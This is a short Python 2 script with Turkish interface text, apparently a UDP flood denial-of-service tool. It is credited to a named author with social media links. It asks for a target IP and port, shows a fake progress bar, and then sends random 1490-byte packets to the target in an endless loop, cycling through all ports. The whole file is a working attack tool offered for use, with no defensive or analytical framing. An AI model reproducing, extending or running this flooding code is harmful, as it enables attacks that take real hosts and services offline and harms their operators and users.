import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Saldırısı")
print
print "Kod Sahibi   : SakirBey1"
print "İnstagram : https://www.instagram.com/sakirbey81"
print "github   : https://github.com/SakirBey1"
print "Telegram : https://t.me/SakirBey1"
print
ip = raw_input("IP Giriniz : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Saldırısı Başlıyor")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Gönderilmiş %s paket ile %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

